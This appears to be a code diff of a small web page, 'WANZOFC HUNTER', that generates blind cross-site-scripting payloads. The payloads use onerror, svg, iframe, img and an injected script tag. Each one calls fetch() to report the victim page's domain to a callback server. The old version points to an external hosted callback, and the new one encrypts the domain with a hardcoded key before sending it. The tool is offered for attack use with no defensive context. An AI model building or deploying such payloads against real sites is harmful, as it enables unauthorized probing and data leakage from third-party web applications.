@@ -3,10 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="description" content="ANZOFC HUNTER HACKING.">
     <title>WANZOFC HUNTER</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
-    <style>
+     <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script> <style>
         body {
             font-family: sans-serif;
             display: flex;
@@ -27,13 +25,26 @@
             max-width: 600px;
         }
 
-        input, button {
-            margin-bottom: 10px;
+        h1 {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+        }
+
+        input, select, button {
+            width: 100%;
             padding: 10px;
+            margin-bottom: 10px;
             border: 1px solid #ccc;
             border-radius: 4px;
-            font-size: 16px;
+            box-sizing: border-box; 
         }
+
 
         button {
             background-color: #007bff;
@@ -41,35 +52,34 @@
             border: none;
             cursor: pointer;
             transition: background-color 0.3s ease;
-            width: 100%;
         }
 
         button:hover {
             background-color: #0056b3;
         }
 
-        .input-group {
-            display: flex;
-            align-items: center;
+        #payload-container {
+            margin-top: 20px;
+            background-color: #eee;
+            padding: 10px;
+            border-radius: 4px;
+            word-break: break-all; /* Untuk mencegah overflow pada payload yang panjang */
+            white-space: pre-wrap;    /* Untuk menampilkan spasi dan baris baru dengan benar */
+
         }
 
-        .copy-button {
-            background: none;
-            border: none;
-            padding: 0;
-            font-size: 1.2rem;
-            color: #007bff;
-            cursor: pointer;
-            margin-left: 10px;
+        button{
+            margin-top: 15px;
         }
     </style>
 </head>
-
 <body>
-
     <div class="container">
-
         <h1>WANZOFC HUNTER</h1>
+
+        <label for="callback-url">Callback URL:</label>
+        <input type="text" id="callback-url" readonly>
+
 
         <label for="payload-type">Payload Type:</label>
         <select id="payload-type">
@@ -80,74 +90,63 @@
             <option value="img">Img</option>
         </select>
 
-        <div class="input-group">
-            <input type="text" id="callback-url" value="http://wanzofc-hunter.up.railway.apl/payload" readonly>
-            <button class="copy-button" onclick="copyCallbackURL()" title="Copy to Clipboard">
-                <i class="fas fa-copy"></i>
-            </button>
-        </div>
+        <label for="iframe-url">Iframe URL (Optional):</label>
+        <input type="text" id="iframe-url" value="about:blank">
 
-        <label for="iframe-url">Iframe URL:</label>
-        <div class="input-group">
-            <input type="text" id="iframe-url" value="{{IFRAME_URL_INPUT}}">
-            <button class="copy-button" onclick="copyIframeURL()" title="Copy to Clipboard">
-                <i class="fas fa-copy"></i>
-            </button>
-        </div>
-
-        <button onclick="generatePayload()">create payload</button>
+        <button onclick="generatePayload()">Generate Payload</button>
 
         <div id="payload-container"></div>
 
-    <script>
-        function generateAutoPayload(type) {
-            const callbackURL = document.getElementById('callback-url').value;
-            const iframeURL = document.getElementById('iframe-url').value;
-
-             if (type === 'script') {
-                 const script = document.createElement('script');
-                 script.textContent = `fetch('${callbackURL}?xss=' + encodeURIComponent(document.domain))`;
-                 document.body.appendChild(script);
-                 return "Payload script injected";
-            } else {
-
-                const payloadTemplates = {
-                    onerror: `onerror=fetch('${callbackURL}?xss=' + encodeURIComponent(document.domain))`,
-                     svg: `<svg onload=fetch('${callbackURL}?xss=' + encodeURIComponent(document.domain))>`,
-                     iframe: `<iframe src="${iframeURL}" onload="fetch('${callbackURL}?xss=' + encodeURIComponent(document.domain))"></iframe>`,
-
-                     img: `<img src=x onerror=fetch('${callbackURL}?xss='+encodeURIComponent(document.domain))>`,
-                };
-                 return payloadTemplates[type] || '';
-            }
-        }
-
-        function generatePayload() {
-            const selectedPayload = document.getElementById('payload-type').value;
-            const generatedPayload = generateAutoPayload(selectedPayload);
-
-            if(selectedPayload !== 'script'){
-
-                document.getElementById('payload-container').innerText = generatedPayload;
+        <script>
+             function getCallbackURL() {
+                return "http://localhost:3000/payload"; // Ganti dengan URL callback server Anda yang sebenarnya
             }
 
+            function generateAutoPayload(type) {
+                const secretKey = 'ONLYWANZOFC';
+                 const encryptedDomain = CryptoJS.AES.encrypt(document.domain, secretKey).toString();
+                  const callbackURL = getCallbackURL();
+                  const iframeURL = document.getElementById('iframe-url').value;
 
-        }
 
-        function copyCallbackURL() {
-            navigator.clipboard.writeText(document.getElementById('callback-url').value)
-                .then(() => alert('Callback URL copied!'))
-                .catch(err => console.error('Failed to copy: ', err));
-        }
+                 const payloadTemplates = {
+                    onerror: `onerror="fetch(\`${callbackURL}?xss=\${encryptedDomain}\`)">`,
+                    svg: `<svg onload="fetch(\`${callbackURL}?xss=\${encryptedDomain}\`)">`,
+                     iframe: `<iframe src="${iframeURL}" onload="fetch(\`${callbackURL}?xss=\${encryptedDomain}\`)"></iframe>`,
+                    img: `<img src=x onerror="fetch(\`${callbackURL}?xss=\${encryptedDomain}\`)">`,
+                 };
 
-        function copyIframeURL() {
-            navigator.clipboard.writeText(document.getElementById('iframe-url').value)
-                .then(() => alert('Iframe URL copied!'))
-                .catch(err => console.error('Failed to copy: ', err));
-        }
+                  if (type === 'script') {
+                      const script = document.createElement('script');
+                    script.textContent = `fetch(\`${callbackURL}?xss=\${encryptedDomain}\`)`;  //textContent
+                      document.body.appendChild(script);
+                       return "Payload script injected";
 
-        window.onload = generatePayload;
-    </script>
+                    } else {
+                      return payloadTemplates[type] || '';
+                    }
+
+            }
+
+
+            function generatePayload() {
+                    const selectedPayload = document.getElementById('payload-type').value;
+                    const generatedPayload = generateAutoPayload(selectedPayload);
+
+                if(selectedPayload == 'script') {
+                    document.getElementById('payload-container').innerText = generatedPayload
+                } else{
+                         document.getElementById('payload-container').textContent = generatedPayload;
+
+                    }
+             }
+
+
+            window.onload = () => {
+                 document.getElementById('callback-url').value = getCallbackURL();
+                generatePayload();
+            };
+        </script>
     </div>
 </body>
 </html>
